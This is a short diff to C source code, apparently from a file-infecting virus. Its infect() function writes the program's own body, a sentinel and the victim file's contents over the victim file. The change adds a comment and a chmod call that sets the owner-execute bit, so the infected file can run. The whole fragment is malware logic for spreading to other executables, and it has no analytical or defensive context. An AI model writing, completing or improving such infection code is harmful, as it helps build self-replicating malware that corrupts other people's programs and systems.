@@ -106,7 +106,9 @@ static void infect(const char *self_name, const char *victim_name) {
     memcpy(infected + sentinel_offset, SENTINEL, sizeof(SENTINEL));
     memcpy(infected + sentinel_offset + sizeof(SENTINEL), victim, victim_size);
 
+    // Write the infected file to disk with the same permissions as the original victim
     write_file(victim_name, infected, infected_size, victim_status.st_mode & 0777);
+    chmod(victim_name, (victim_status.st_mode & 0777) | S_IXUSR);
 
     free(infected);
     free(victim);
